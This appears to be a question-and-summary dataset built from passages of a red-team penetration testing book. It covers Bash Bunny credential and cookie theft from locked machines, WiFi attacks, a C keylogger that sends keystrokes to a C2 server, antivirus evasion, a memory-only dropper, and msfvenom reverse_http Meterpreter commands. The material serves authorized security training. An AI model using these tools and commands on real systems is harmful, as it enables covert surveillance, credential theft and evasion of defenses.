    "text": "mediaroot/BashBunny/payloads/switch1/\ncp -R optbashbunny-\npayloads/payloads/library/credentials/QuickCreds/*\nmediaroot/BashBunny/payloads/switch2/\nNote, in each of the switch1 and 2 folders is a file named\npayload.txt. In each of these files, you need to configure it\nto either attack Windows or Mac machines. For Windows\nmachines, make sure the ATTACKMODE is set to\nRNDIS_ETHERNET and for Mac, configure it to\nECM_ETHERNET\nQuickCreds\nQuickCreds is an awesome tool that utilizes Responder attack to capture\nNTLMv2 Challenge Hashes from locked and unlocked machines. Let's say you\ndo a physical assessment where you break into a building and come across a\nbunch of locked machines. You plug in the Bash Bunny on the switch with\nQuickCreds and wait about 2 minutes per machine. The Bash Bunny will take\nover the network adaptor, reroute any requests for shares and authentication\nusing Response, and then log that data. It saves all creds to the loot folder on the\nUSB Disk.\nReferences:\nhttps://github.com/hak5/bashbunny-\npayloads/tree/master/payloads/library/credentials/QuickCreds\nhttps://room362.com/post/2016/snagging-creds-from-locked-\nmachines/\nBunnyTap\nBunnyTap is based on Samy Kamkar's infamous PoisonTap\n(https://www.youtube.com/watch?v=Aatp5gCskvk). PoisonTap was an\nawesome tool that, even from a locked machine, does the following:\nEmulates an Ethernet device over USB (or Thunderbolt)\nHijacks all Internet traffic from the machine (despite being a low\npriority/unknown network interface)\nSiphons and stores HTTP cookies and sessions from the web browser\nfor the Alexa top 1,000,000 websites\nExposes the internal router to the attacker, making it accessible\nremotely via outbound WebSocket and DNS rebinding (thanks Matt\nAustin for the rebinding idea!)\nInstalls a persistent web-based backdoor in HTTP cache for hundreds\nof thousands of domains and common JavaScript CDN URLs, all\nwith access to the user’s cookies via cache poisoning\nAllows attacker to remotely force the user to make HTTP requests\nand proxy back responses (GET & POSTs) with the user’s cookies\non any backdoored domain\nDoes not require the machine to be unlocked\nBackdoors and remote access persist even after device is removed\nand attacker sashays away [https://samy.pl/poisontap/]\nFrom a physical assessment perspective, you go into their office, plug it into\neach machine, and wait about 2 minutes. The Bash Bunny will route all traffic\nto the Bash Bunny. If they have a browser open and active (like ads or any page\nthat regularly updates), the BunnyTap will kick in and request all the Alexa top\n1,000,00 websites. If the victim user is logged into any of these sites at the time,\nthe BunnyTap will capture all of the victim's cookies. Now, we can take these\ncookies onto our own computers, replace our cookies with theirs, and become\nthem without ever knowing their passwords.\nMake sure to check out all the cool Bash Bunny payloads:\nhttps://github.com/hak5/bashbunny-\npayloads/tree/master/payloads/library.\nWiFi\nIn terms of WiFi, there haven't been any significant changes in how we attack\nclients. Although we are starting to see significantly less WEP networks, the\nattacks still consist of deauth, aireplay-ng, and capturing IV packets. For WPA\nwireless networks, the best option here still is to deauth a client, capture the\nhandshake, pass it over to hashcat, and crack the password. Both these methods\nwork great and my favorite tool to use is the completely rewritten version of\nWifite2 (https://github.com/derv82/wifite2) using an Alfa AWUS036NHA\nwireless card. This is a simple-to-use interface as it can support numerous\nattacks, sits on top of aircrack, and makes it easy to crack the captured hashes.\nIn terms of equipment, other than getting a couple Alfas, the easy way to\nperform more evasive WiFi attacks is using the WiFi Pineapple Nanos\n(https://www.wifipineapple.com/pages/nano). If you need to spin up a fake\nHostAP, reroute traffic through another antenna, stand up fake pages to capture\nauthentication, perform all the MITM attacks, run Responder, and other attacks,\nthe Nano is a lightweight hardware tool to perform this.\nFor those who don't subscribe to the Pineapple, there are some great tools out\nthere that do many of the corporate attacks. One of these tools is eaphammer\n(https://github.com/s0lst1c3/eaphammer). The features of eaphammer:\nSteal RADIUS credentials from WPA-EAP and WPA2-EAP\nnetworks.\nPerform hostile portal attacks to steal AD creds and perform indirect\nwireless pivots\nPerform captive portal attacks\nBuilt-in Responder integration\nSupport for Open networks and WPA-EAP/WPA2-EAP\nNo manual configuration necessary for most attacks.\nNo manual configuration necessary for installation and setup process\nLeverages latest version of hostapd (2.6)\nSupport for evil twin and karma attacks\nGenerate timed Powershell payloads for indirect wireless pivots\nIntegrated HTTP server for Hostile Portal attacks\nSupport for SSID cloaking\nThe best part of eaphammer is using the custom attack features to perform\nresponder style attacks or capture NTLM challenge authentication hashes for\ncracking (https://github.com/s0lst1c3/eaphammer#iii---stealing-ad-credentials-\nusing-hostile-portal-attacks) and indirect pivots\n(https://github.com/s0lst1c3/eaphammer#iv---indirect-wireless-pivots).\nConclusion\nPhysical attacks are one of the most fun to do. They get the adrenaline pumping,\nmake you feel like a criminal, and force you to think evilly. On many of our\nengagements, we may spend a couple days just casing a company, watching the\nguard rotations, and figuring out what types of doors they have. We might try to\ntake long range photos of their badges, record hours when people leave the\nbuilding, and identify weak spots that would get us into the building.\nFrom a Red Team perspective, we want to take note of weak spots not only in\ntheir physical security, but in their people as well.\nIf you trigger an alarm, how long does it take for someone to check it\nout?\nAre the cameras monitored 24/7? If so, if something is suspicious,\nhow long until a comes to investigate?\nAre the employees watching for tail-gating?\nIf you do get stopped, are you able to talk your way out of it?\nIf you dress up as someone similar to facilities staff (or any third\nparty service) what types of reactions do you get?\nLast note, before you get started, make sure you have a well-defined scope, a get\nout of jail letter, phone numbers for the CISO/Physical Security, and be sure to\nwork with the company. The more you can detail out, the less likely you will be\nthrown onto the ground by guards, but there's no guarantee . . .",
    "question": "What are the key configurations and tools required for the Bash Bunny to capture credentials from locked Windows and Mac machines, and how do they differ in their attack methods?",
    "summary": "The text explains two tools, QuickCreds and BunnyTap, used in physical attacks to capture credentials from locked machines. QuickCreds captures NTLM hashes, while BunnyTap siphons cookies and allows remote access without needing the machine to be unlocked. It also discusses WiFi attack methods, including deauth, aireplay-ng, and eaphammer, which can steal credentials from wireless networks. The conclusion emphasizes the importance of physical security assessments and planning to avoid detection and ensure successful penetration."
  },
  {
    "start": 96,
    "end": 99,
    "text": "7 the quarterback sneak - evading av and network\ndetection\nWriting Code for Red Team Campaigns\nOne of the things that sets apart successful Red Teamers and Penetration Testers\nis the ability to adapt and understand different protections. Whether it is\nunderstanding low-level assembly, writing shellcode, creating a custom C2\nbinary, or modifying code caves to hide our malware, it's all part of our daily\njob. I come across pentesters all the time who can't code and although it is not a\nrequirement, it definitely causes a plateau in their professional growth.\nTherefore, I wanted to dedicate a section to those who haven't really coded in\nlower-level languages in order to give them a start.\nThe Basics Building a Keylogger\nKeyloggers are an essential tool to any pentest/Red Team and this section will\nwalk you through making a generic keylogger. There are times when we just\nwant to continually monitor a certain user or get additional credentials. This\nmight be because we can't get any sort of lateral movement/privilege escalation\nor we might just want to monitor the user for future campaigns. In these cases,\nwe like to drop keyloggers that continually run on a victim's system and send\ntheir keystrokes outbound. The following example is just a POC and the\npurpose of this lab is for you to understand the basics and build from here. The\nreasons it is all in C are to keep the binary relatively small, have better OS\ncontrol due to lower level languages, and evade AV. In the prior book, we wrote\na keylogger in Python and compiled it with py2exe to make it into a binary, but\nthose can be easily detected. Let's walk through a slightly more complex\nexample.\nSetting up your environment\nThis is the basic setup you need to write and compile in C to make Windows\nbinaries and create the custom keylogger.\nWindows 10 in a Virtual Machine\nInstall Visual Studio so that you could use the command line\ncompiler along with Vim for code editing\nThe best coding resource for Windows API programming by far is Microsoft’s\nown Development Network (MSDN) website found here:\nwww.msdn.microsoft.com. MSDN is an invaluable resource that details system\ncalls, type and struct definitions, and includes dozens of examples. While it\nwasn't really needed for this project, a more in-depth understanding of the\nWindows OS can be found by reading the Windows Internals books published\nby Microsoft Press. For C, there is a good book co-authored by one of the\nfounders of C called, The C Programming Language by Kernighan and Ritchie.\nLastly, read Beej’s Guide to Network Programming, available in print and\nonline, which is a great primer on socket programming in C.\nCompiling from Source\nIn these labs, there are going to be multiple code samples and examples. The\nlabs will be compiling the code using Microsoft’s Optimizing Compiler, which\ncomes with Visual Studio Community and is built into the Visual Studio\nDeveloper Command Prompt. Once VS Community is installed, make sure to\nalso install the Universal Windows Platform development and Desktop\ndevelopment with C++ under Tools -> Get Tools and Features. To compile the\nexamples, open up an instance of the developer command prompt, then navigate\nto the folder that contains the source files. Finally, run the command “cl\nsourcefile.c io.c”. This will produce an executable with the same name as the\nsource file.\nThe compiler defaults to 32-bit, but this code can also be compiled in 64-bit. To\ncompile the code for 64-bit, run the batch script located in the Visual Studio\nfolder. In a command prompt, navigate to “C:\\Program Files (x86)\\Microsoft\nVisual Studio\\2017\\Community\\VC\\Auxiliary\\Build”, note that this path might\nchange depending on your version of Visual Studio. Then, run the command\n“vcvarsall.bat x86_amd64”, this will set the Microsoft Compiler to compile 64-\nbit binaries instead of 32-bit. Now, you can compile the code by running “cl\npath/to/code.c”.\nSample Framework\nThe goal of this project is to create a keylogger that utilizes C and low-level\nWindows functions to monitor keystrokes. This keylogger makes use of the\nSetWindowsHookEx and LowLevelKeyboardProc functions.\nSetWindowsHookEx allows the setting of various types of hooks in both local\nand global contexts. In this case, the WH_KEYBOARD_LL parameter will be\nused to pull low-level keyboard events. The function prototype for\nSetWindowsHookEx looks like this (http://bit.ly/2qBEzsC): HHOOK WINAPI\nSetWindowsHookEx(\nIn int idHook,\nIn HOOKPROC lpfn,\nIn HINSTANCE hMod,\nIn DWORD dwThreadId\n);\nThe function takes an integer to a hook ID, a pointer to a function, a handle\nmodule, and a thread ID. The first two values are the most important. The hook\nID is an integer for the type of hook that you are going to install. Windows has\nthe available IDs listed on the function page. In our case, the ID 13, or\nWH_KEYBOARD_LL will be used. The HOOKPROC is a pointer to a\ncallback function that will be called every time the hooked process receives\ndata. This means that every time a key is pressed, the HOOKPROC will be\ncalled. This is the function that will be used to write the keystrokes to the file.\nhMod is a handle to a DLL that contains the function that the lpfn points to. This\nvalue will be set to NULL because a function is used in the same process as\nSetWindowsHookEx. dwThreadId will be 0 to associate the callback with all of\nthe threads on the desktop. Finally, the function returns an integer, which will\nbe used to verify that the hook was set properly or exit otherwise.\nThe second part that is required will be the callback function. The callback\nfunction will do the heavy lifting for this program. This function will handle\nreceiving the keystrokes, transforming them into ASCII letters, and all of the file\noperations. The prototype for the LowLevelKeyBoardProc\n(http://bit.ly/2HomCYQ) looks like this: LRESULT CALLBACK\nLowLevelKeyboardProc(\nIn int nCode,\nIn WPARAM wParam,\nIn LPARAM lParam\n);\nLet's review what is required for the LowLevelKeyBoardProc. The parameters\nfor the function are an integer that tells Windows how to interpret the message.\nTwo of these parameters are: (1) wParam, which is an identifier of the message,\nand (2) lParam, which is a pointer to a KBDLLHOOKSTRUCT structure. The\nvalues for wParam are specified in the function page. There is also a page that\ndescribes the members of a KBDLLHOOKSTRUCT. The value of the lParam\nKBDLLHOOKSTRUCT is the vkCode or Virtual Key Code\n(http://bit.ly/2EMAGpw). This is the code for the key that was pressed and not\nthe actual letter as the letters could vary based on the language of the keyboard.\nThe vkCode will need to be converted later to the appropriate letter. For now, do\nnot worry about passing parameters to our keyboard callback function because\nthey will be passed by the operating system when the hook is activated.\nSo, the initial skeleton code for hooking the keyboard would look like this:\nhttps://github.com/cheetz/ceylogger/blob/master/skeleton.\nAs you are reviewing the skeleton code, some things to note are the inclusion of\nthe pragma comment line, the message loop, and the return CallNextHookEx\nline in the callback function. The pragma comment line is a compiler directive\nto link the User32 DLL. This DLL holds most of the function calls that will be\nmade and so it is required to be linked. It could also have been linked with the\ncompiler options. Next, the message loop is necessary if\nLowLevelKeyboardProc functions are being used. MSDN states, “This hook is\ncalled in the context of the thread that installed it. The call is made by sending a\nmessage to the thread that installed the hook. Therefore, the thread that installed\nthe hook must have a message loop.\" [http://bit.ly/2HomCYQ]\nThe CallNextHookEx is returned because MSDN states “Calling the\nCallNextHookEx function to chain to the next hook procedure is optional, but it\nis highly recommended; otherwise, other applications that have installed hooks\nwill not receive hook notifications and may behave incorrectly as a result. You\nshould call CallNextHookEx unless you absolutely need to prevent the\nnotification from being seen by other applications.” [http://bit.ly/2H0n68h]\nNext, we move on to build the functionality of the callback function starting with\na file handle. In the example code, it will create a file named “log.txt” in the\nWindows Temp directory (C:\\Windows\\Temp). The file is configured with\nappend argument because the keylogger needs to continually output the\nkeystrokes to the file. If the file is not present in temp, one will be created.\nGoing back to the KBDLLHOOKSTRUCT, the code declares a\nKBDLLHOOKSTRUCT pointer and then assigns it to the lParam. This will\nallow access to the parameters within the lParam of each key press. Then the\ncode checks to see if the wParam returned “WM_KEYDOWN”, which will\ncheck if the key was pressed down. This was done because the hook will trigger\non both the press and the release of a key. If the code did not check for\nWM_KEYDOWN, the program would write every key twice.\nAfter checking for the downpress, there would need to be a switch statement that\nchecks the vkCode (virtual key code) of the lParam for special keys. Certain\nkeys would need to be written to the file differently than the rest, such as the\nreturn, control, shift, space, and tab keys. For the default case, the code would\nneed to convert the vkCode of the key to the actual letter. An easy way to\nperform this conversion would be to use the ToAscii function. ToAscii will take\nthe vkCode, a ScanCode, a pointer to an array of the keyboard state, a pointer to\nthe buffer that will receive the letter, and an int value for uFlags. The vkCode\nand ScanCode are from the key struct, the keyboard state is a byte array that was\ndeclared earlier, a buffer to hold the output, and the uFlags parameter will be set\nto 0.\nIt is essential to check to see if certain keys were released, such as the shift key.\nThis can be accomplished by writing another \"if statement\" to check for\n“WM_KEYUP” and then have a “switch statement” to check the keys that are\nneeded. Finally, the file would need to be closed and returned back to\nCallNextHookEx. The Callback function looks like this:\nhttps://github.com/cheetz/ceylogger/blob/master/callback\nAt this point, the keylogger is completely functional. However, there are a few\nproblems. The first is that running the program spawns a command prompt,\nwhich makes it very obvious that the program is running, and the lack of output\non the prompt is pretty suspicious. Another problem is that having the file on\nthe same computer on which that keylogger is running, isn’t very helpful.\nThe command prompt problem can be fixed relatively easily by switching the\nstandard C “Main” function entry point with the Windows specific WinMain\nfunction entry point. From my understanding, the reason that this works is\nbecause WinMain is an entry point for a graphical program on Windows.\nAlthough the operating system is expecting you to handle the creation of the\nwindows for the program, we can just tell it not to create any, since we have this\ncontrol. Now, the program just spawns a process in the background without\ncreating any windows.\nThe network side of the program will be straightforward. Start by initializing the\nWindows socket functions by declaring WSAData (http://bit.ly/2HAiVN7),\nstarting winsock, clearing the hints structure, and filling in the relevant wants.\nFor our example, the code will use AF_UNSPEC for IPV4 and SOC_STREAM\nfor TCP connectivity, and use the getaddrinfo function to fill out the c2 struct\nusing the previous wants. After all of the required parameters are met, a socket\ncan be created. Finally, the socket_connect function connects to the socket.\nAfter the connection, the socket_sendfile function will be doing most of the\nwork. It opens a handle to the log file with the Windows “CreateFile” function,\nthen it gets the file size with the “GetFileSizeEx” function. Once the file size is\nobtained, the code will allocate a buffer of that size, plus one for padding, and\nthen read the file into that buffer. Finally, we send the contents of the buffer\nover the socket.",
    "question": "What is the purpose of using C in the keylogger example and how does it help in evading AV detection?",
    "summary": "This text explains how to build a keylogger in C for a Red Team campaign, focusing on low-level Windows functions and evasion techniques to avoid detection. It outlines the process of setting up the development environment, including installing Visual Studio and using MSDN resources. The keylogger uses SetWindowsHookEx to monitor keystrokes and sends the logged data over a network connection to a command and control server."
  },
  {
    "start": 100,
    "end": 102,
    "text": "For the server side, a socat listener can be started on the C2 server on port 3490\n(Command to start socat: socat - TCP4-LISTEN:3490,fork). Once the listener is\nstarted and the keylogger is running, you should see all the commands from the\nvictim host pushed to the C2 server every 10 minutes. The initial complete\nversion 1 of the keylogger can be found here:\nhttps://github.com/cheetz/ceylogger/tree/master/version1. Before compiling the\nversion_1.c, make sure to modify the getaddrinfo to your current C2 IP address.\nTo compile the code: cl version_1.c io.c.\nOne final function that should be mentioned is the thread_func function. The\nthread_func calls the function get_time to get the current minute. It then checks\nto see if that value is divisible by 5, since the tool sends the file every 5 minutes.\nIf it is divisible by 5, it sets up the socket and attempts to connect to the C2. If\nthe connection is successful, it sends the file and runs the cleanup function.\nThen the loop sleeps for 59 seconds. The reason that the sleep function is\nnecessary is because this is all running in a constant loop, which means the\nfunction will get the time, set up the connection, connect, and send the file in\nseconds. Without the 59 second sleep time, the function would end up sending\nthe file possibly dozens of times in the 1 minute interval. The sleep function\nallows the loop to wait long enough for the time to change to the next minute\nand therefore will only send the file one time every 5 minutes.\nObfuscation\nThere are hundreds of different ways to perform obfuscation. Although this\nchapter can't go through them all, I wanted to provide you with some basic\ntechniques and ideas to get around AV.\nAs you may already know, AV tools look for specific strings. One of the\nsimplest methods that can be used to avoid AV is to create a simple rotation\ncipher and shift the characters of the string. In the code below, there is a basic\ndecrypt function that moves all strings by 6 characters (ROT6). This results in\ngarbled strings that may not get detected by AV. At the start of the program, the\ncode will call a decrypt function to take an array of strings and return them to\ntheir regular format. The decrypt function is shown below:\nint decrypt(const char* string, char result[]){\nint key = 6;\nint len = strlen(string);\nfor(int n = 0; n < len; n++){\nint symbol = string[n];\nint e_symbol = symbol - key;\nresult[n] = e_symbol;\n}\nresult[len] = '\\0';\nreturn 0;\n}\nYou can see an example of this in version 2 of the program here:\nhttps://github.com/cheetz/ceylogger/tree/master/version2.\nAnother method that can be used for evading antivirus is to call the functions in\nUser32.dll using function pointers, instead of calling the function directly. To\ndo this, first write a function definition, then find the address of the function to\ncall by using the Windows GetProcAddress function, and lastly, assign the\nfunction definition pointer to the address that was received from\nGetProcAddress. An example of how to call the SetWindowsHookEx function\nby using a function pointer can be found here:\nhttps://github.com/cheetz/ceylogger/blob/master/version3/version_3.c#L197-\nL241 (http://bit.ly/2H0VboE).\nVersion 3 of the program combines the string encryption from the previous\nexample with the method of calling the functions with pointers. It is interesting\nto note that, if you submit the compiled binary to VirusTotal, you will no longer\nsee User32.dll in the imports section. In the photo below, the left image is\nVersion 1 and the right image is Version 3 with calling pointers.\nYou can find the whole source code for Version 3 at:\nhttps://github.com/cheetz/ceylogger/tree/master/version3.\nIn order to see if you have successfully evaded AV, the best option is to always\ntest it against live AV systems. In a real world campaign, I don't recommend\never using VirusTotal, as your samples may be sent to the different vendors.\nHowever it is great for testing/learning. For our payloads, here is the VirusTotal\nComparison: For Version 1, 32bit, 11/66 triggered AV:\nhttps://www.virustotal.com/#/file/4f7e3e32f50171fa527cd1e53d33cc08ab85e7a945cf0c0fcc978ea62a44a62d/detection\nhttp://bit.ly/2IXfuQh\nFor Version 3, 32bit, 10/66 triggered AV:\nhttps://www.virustotal.com/#/file/8032c4fe2a59571daa83b6e2db09ff2eba66fd299633b173b6e372fe762255b7/detection\nhttp://bit.ly/2IYyM7F\nFinally, if we compile Version 3 as a 64bit payload, we get 0/66!:\nhttps://www.virustotal.com/#/file/e13d0e84fa8320e310537c7fdc4619170bfdb20214baaee13daad90a175c13c0/detection\nhttp://bit.ly/2JNcBmc\nLab:\nWhere do you go from here? The ideas are limitless! A little fix might be to\nobfuscate/encrypt the log.txt contents or to initiate an encrypted socket once the\nprogram starts and then write the keystrokes right to that socket. On the\nreceiving side, the server would reconstruct the stream and write it to a file. This\nwould stop the log data from being seen in plain text, as it currently is, and also\nprevent more artifacts from touching disk.\nAnother strong improvement would be to convert the executable into a DLL and\nthen inject the DLL into a running process. This would prevent even the process\ninformation from showing up in task manager. Though there are programs that\nwill show you all of the currently loaded DLLs on a system, injecting the DLL\nwould be much stealthier. Additionally, there are some programs that can\nreflectively load a DLL from memory without touching disk at all, further\ndecreasing your forensic footprint.\nTHP Custom Droppers\nDroppers are an important part of a Red Team’s toolkit, allowing you to run\nyour implants without having them on the victim’s computer. Keeping your\nimplants off disk reduces the risk of them being compromised, allowing your\nwork to be used multiple times. In this chapter, we are going to cover a custom\nTHP-developed dropper that imports either shellcode or a DLL that stays\nresident only in memory.\nWhen designing a dropper and corresponding server, there are a few things you\nneed to keep in mind. The purpose of the dropper is to be a use-and-burn piece\nof your arsenal, meaning you will have to assume that using it in its current form\nwill trigger detection in further campaigns.\nIn order to make future campaigns easier, you will want to develop a standard\nserver, which you can use repeatedly. In the example, you will see a basic\nnetworking implementation, which allows for new handlers to be registered for\ndifferent messages. While this example only includes handlers for a\nLOAD_BLOB message type, you can easily add new handlers to extend\nfunctionality. This makes for a good baseline, as you have all your\ncommunication standardized.\nAnother important step when writing droppers, or anything else you expect to be\nfound quickly and reverse engineered, is to sanitize your strings. Debug\nmessages are great when you are first building software, relieving you from\nhaving to manually step through your debugger to see why something’s\nbreaking. However, if they are accidentally left in on final release, you will\nmake the analyst’s job much easier in reversing your malware. Many times anti-\nviruses will signature something off a unique string, or a constant value. In the\nexample, I use InfoLog() and ErrorLog(), which the pre-processor will compile\nout on release builds. Using those macros, which check if _DEBUG is defined,\nwill dictate whether or not to include the relevant calls.\nTHP Custom Dropper Code: https://github.com/cheetz/thpDropper.git\nShellcode vs DLLs\nIn the following example, you are able to have the dropper load either full DLLs\nor shellcode. Generally with many public implants, you are able generate a full\nDLL, which will download the DLL and then reflect it. Having your dropper\nload the DLL directly will save you from making a few more API calls,\nremaining stealthier. Some implants might not load correctly due to their headers\nbeing modified. If one of your implants isn’t working properly and includes a\nmethod to generate shellcode, then this should solve your problem. This is\nbecause their custom loader is usually written to fix up the headers and load it\nfrom that DLL.\nThere is also a large amount of shellcode available online, sites like shell-\nstorm.org hold archives of shellcode written for specific purposes, some of\nwhich might come in handy for your campaigns.\nRunning the Server\nBuilding the server is straightforward. On your Custom THP Kali image, you\nwill need to run the following commands:\nFor first-time compiling:\ncd opt\nsudo apt-get install build-essential libssl-dev cmake git\ngit clone https://github.com/cheetz/thpDropper.git\ncd thpDropper/thpd\nmkdir build\ncd build\ncmake ..\nmake\nFor subsequent compiling, all you will need to do is:\ncd optthpd/build\nmake\nTo run the server, after you compile it, you will type:\n./thpd [path to shellcode/DLL] [loadtype]\nThe following values are currently valid for load type:\n0 Shellcode This will send raw shellcode bytes to the client\n1 DLL This will send a normal DLL file to be reflectively loaded in the\nclient",
    "question": "How can a custom dropper be used to run implants without leaving them on the victim's disk?",
    "summary": "The text explains how to set up a server using socat to receive data from a keylogger that sends logs every 5 minutes. It also discusses methods to evade antivirus detection, such as using a rotation cipher and calling functions via pointers. Additionally, it covers a custom dropper tool that can load either shellcode or a DLL into memory, reducing the risk of detection. The tool is designed to be used in a Red Team campaign to avoid leaving traces on the victim's system."
  },
  {
    "start": 103,
    "end": 114,
    "text": "Although these payloads (shellcode/DLL) can be from any type of C2 tool\n(Metasploit/Meterpreter, Cobalt Strike, etc), we will be using a Meterpreter\npayload for our examples. Generating a Payload:\nFor Shellcode payloads:\nmsfvenom -a x64 -p\nwindows/x64/meterpreter/reverse_http LHOST=\n<Your_IP> LPORT=<PORT>\nEnableStageEncoding=True -f c\nNote, you will have to take the output of msfvenom and\nonly take the raw shellcode (remove quotes, new lines,\nand anything not shellcode).\nTo start the server: ./thpd ./shellcode.txt 0\nFor DLL payloads:\nmsfvenom -a x64 -p\nwindows/x64/meterpreter/reverse_http LHOST=\n<Your_IP> LPORT=<PORT>\nEnableStageEncoding=True -f dll > msf.dll\nTo start the server: ./thpd ./msf.dll 1\nClient\nThe client functions in a similar way to the server, where it registers a handler\nfor each message type. On startup, it will attempt to call back to the server, and\nretry for n attempts if unable to connect or upon disconnect, and send a message\nasking for a blob to load. The server will respond back with a BLOB_PACKET,\nwhich the client will recognize and dispatch via the head->msg field. All packets\nmust have the HEAD_PACKET field defined at the start, otherwise the network\nhandler will not be able to recognize it, and throw it away. Using the\nBuildPacketAndSend() function will correctly set up the head packet, allowing\nthe other side to decode it.\nTo build the client, you will need Visual Studio and Git. Start by cloning the Git\nrepository (https://github.com/cheetz/thpDropper.git) into a folder, and then\nopen up thpDropper.sln in Visual Studio. Make sure you are set to the proper\narchitecture for the code you are dropping, and set it to build for release if you\ndon’t want any debug messages. Once you have done this, hit F7 and Visual\nStudio should generate the executables for you.\nConfiguring the Client and Server\nMost of the client’s configuration is accessible in the globals.cpp file, the three\nmain configuration settings you will want to change are the hostname, the port,\nand the packet duration. There are comments next to each one, telling you what\nthey are. While you don’t need to change the packet signature, changing it will\nmodify the first 2 bytes of each packet that are sent, which is used to identify\nthat it is a valid connection on the server. If you wish to obfuscate the IP and\nport, you could write code to decrypt them when they are being accessed, and\nonly store the encrypted version in the binary.\nOn the server side, in the main.cpp file, you can modify the port that the server is\nlistening on. This configuration is in the main function as the only parameter to\nStartupNetworking(). If you decide to change the packet signature in the client,\nyou will need to modify the server to reflect that. This means that in\ninclude/lib/networking.h, the PACKET_SIGNATURE value needs to match the\nglobal value in the client.\nAdding New Handlers\nThe networking code base is set up to allow you to easily add new functionality.\nTo do so, you will need to create a callback function, with the prototype of void\nname() on the client, or void name(int conn) on the server. These will be\nregistered to an array of handlers for your message types, and upon the head\npacket being validated, they will be called. It is your responsibility in these\nfunctions to read your packet and data from the recv buffer. You will want to\ncall recv() to a pointer on your packet’s structure, along with the size of that\npacket. This will provide information about how much to pull off the recv\nbuffer. In this example, you will see that we read the BLOB_PACKET in our\nhandler, then used the value stored in packet.payloadLen to dictate how many\nbytes further we had to read. The same principle can be applied to other data\ntypes. If you want to send a string containing the file path to some file on the\nvictim’s computer, you would have a field in the handler’s packet describing the\nlength of the string, which you would send after the packet.\nFurther Exercises\nWhile this code will give you a solid base to work with, there are many ways\nyou can improve it yourself. Adding a simple encryption layer to the transport\nlayer would be straightforward. You would want to create your own send and\nrecv wrappers, which decrypt/encrypt before calling the send and recv functions.\nAn extremely easy way to do this would be to use a multi byte XOR key, which\nwhile not very secure, would at least change your messages enough to not be\neasily identifiable. Another exercise could be to extend the LoadBlobHandler()\nfunction to have a new LOAD_TYPE, which would load a signed driver if the\nclient is being run as administrator. This can be accomplished by using the\nCreateService() and StartService() winapi calls. However, keep in mind that\nloading a driver requires it to be on disk, which will trigger a file system mini-\nfilter driver to pick it up.\nRecompiling Metasploit/Meterpreter to Bypass AV\nand Network Detection\nI really wanted to cover this topic. Be aware that this is going to be a little more\nadvanced and you will most likely run into some issues during compile time.\nThere are plenty of great tools like Metasploit/Meterpreter out there, but every\nantivirus and network intrusion detection (NID) tool has developed signatures\nfor it. We can try to obfuscate payloads with Shikata Ga Nai and go over\nHTTPS, but that only goes so far. Any type of obfuscation will generally have a\nstub signature to detect off of, AV will look into memory for certain strings in\ncertain locations, and networks perform man-in-the-middle inspection over\nHTTPS. So how can we do to keep using our favorite tools, while getting\naround all the common protections? Let's take the example of\nMetasploit/Meterpreter and see how we can bypass all these hurdles. Our goals\nare to get around AV signatures on the binary, AV signatures in memory, and\nnetwork signatures.\nIn order to evade all these detection methods, we will need to do a few things.\nFirst, we need to modify the Meterpreter payloads to make sure they aren't easily\ndetected with signatures both on the network and in memory. Second, we modify\nthe metsvc persistence module to prevent it from flagging antivirus. Third, we\ncompile portions of metsrv (the actual Meterpreter payload) with Clang, to\nprevent it also from flagging antivirus signatures. Last, we will write our own\nstage0 payload, which downloads and executes Meterpreter, to bypass all\nantivirus.\nCompiling metsrv (network service wrapper for Meterpreter) with Clang and\nremove metsrv/metsvc-server references:\nhttp://bit.ly/2H2kaUB\nModifying Payloads to get rid of strings like Mimikatz\nhttp://bit.ly/2IS9Hvl\nModified Reflective DLL Injection to remove strings like ReflectiveLoader\nhttp://bit.ly/2qyWfFK\nMany network products detect the stage 0/1/2 loaders of Meterpreter as they go\nacross the wire. Besides obfuscating our payload, we can also obfuscate the\nactual shellcode. One example is to go through all the Ruby files for the\ndifferent payload types and add random nop sleds to avoid detection:\nhttp://bit.ly/2JKUhdx\nCustom Stage0 Payload:\nhttp://bit.ly/2ELYkm8\nLAB:\nIn this lab, we are going to take all of our modified Metasploit/Meterpreter code,\nrecompile it, and make sure that it can evade basic AV detection.\nBefore starting, review the build environment setup from Metasploit:\nhttps://github.com/rapid7/metasploit-\npayloads/tree/master/c/meterpreter\nhttps://github.com/rapid7/metasploit-framework/wiki/Setting-Up-a-\nMetasploit-Development-Environment\nRequirements for Windows:\nVisual Studio 2013 (VS2013) - Community edition is fine. Need\nC/C++ installed with the install\nLLVM 32bit installed for windows (install this AFTER visual studio\nand make sure llvm toolchain installs) - Download LLVM 6 @\nhttp://releases.llvm.org/download.html\nGNU Make installed on windows\n(http://gnuwin32.sourceforge.net/packages/make.htm) - Make sure\nthis is in your path or that you run it from its installed path where\napplicable.\nGit-SCM (git-scm.com)\nHow to Build Metasploit/Meterpreter on Windows:\nStart by pulling all the cyberspacekitten's repositories. These files have already\nbeen heavily modified for your lab, but as a proof of concept. First, we need to\npull down both the framework and all the payloads:\ngit clone https://github.com/cyberspacekittens/metasploit-framework\ncd metasploit-framework && git submodule init && git submodule\nupdate && cd ..\ngit clone https://github.com/cyberspacekittens/metasploit-payloads\ncd metasploit-payloads && git submodule init && git submodule\nupdate && cd ..\nAlthough all the changes to modify strings, compile to clang, and payload nops\nare already made in these repositories, be sure to review the Metasploit diff\nbetween these two to see exactly what was changed.\nCompile Metasploit/Meterpreter\nThe first thing we are going to do is recompile our metsvc and metsvc-server\nwith our updated changes. From Visual Studio 2013 Command Prompt for\nVS2013:\nGo to the folder where the source code for our modified metsvc is.\ncd metasploit-framework\\external\\source\\metsvc\\src\nCompile using make:\n\"C:\\Program Files (x86)\\GnuWin32\\bin\\make.exe\"\nMove our newly created binaries to our meterpreter folder:\ncopy metsvc.exe ..\\..\\..\\..\\data\\meterpreter\\\ncopy metsvc-server.exe ..\\..\\..\\..\\data\\meterpreter\\\nNext, modify our Meterpreter Payloads and compile them using the supplied .bat\nfile:\ncd metasploit-payloads\\c\\meterpreter\nmake.bat\nAfter everything is compiled, two folders are generated (x86 and x64). Copy all\nthe compiled DLLs to the meterpreter folder:\ncopy metasploit-payloads\\c\\meterpreter\\output\\x86\\* metasploit-\nframework\\data\\meterpreter\ncopy metasploit-payloads\\c\\meterpreter\\output\\x64\\* metasploit-\nframework\\data\\meterpreter\nThat is it for the server. We can now move the entire metasploit-framework\nfolder to your Kali System and start an HTTPS reverse handler\n(windows/x64/meterpreter/reverse_https).\nCreating a Modified Stage 0 Payload:\nThe last thing we need to do is create a Stage 0 payload to have our initial\nexecutable bypass all AV detection. If you aren't aware, a Stage 0 in Meterpreter\nis the first stage of any exploit or payload. This is a chunk of code 